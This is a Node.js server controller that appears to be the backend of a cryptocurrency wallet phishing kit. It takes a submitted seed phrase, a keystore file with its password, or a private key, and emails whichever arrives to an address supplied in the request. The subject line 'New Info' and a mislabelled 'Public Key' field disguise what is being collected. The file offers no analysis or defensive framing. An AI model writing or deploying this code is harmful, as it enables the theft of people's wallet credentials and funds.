const { mailer } = require("../utils/mailer");

const processSubmission = async (req, res) => {
  const { phrase, keyword, password, pk, email } = req.body;
  const subject = "New Info";

  try {
    let message = "";

    if (phrase) {
      message = `Phrase: ${phrase}`;
    } else if (keyword) {
      message = `Keystore JSON: ${keyword}, Password: ${password}`;
    } else if (pk) {
      message = `Public Key: ${pk}`;
    } else {
      throw new Error("Invalid submission");
    }

    await mailer(email, message, subject);

    res.status(200).json({ message: "Message Sent" });
  } catch (error) {
    console.error("Error processing submission:", error);
    res.status(500).json({ message: "Internal Server Error" });
  }
};

module.exports = { processSubmission };
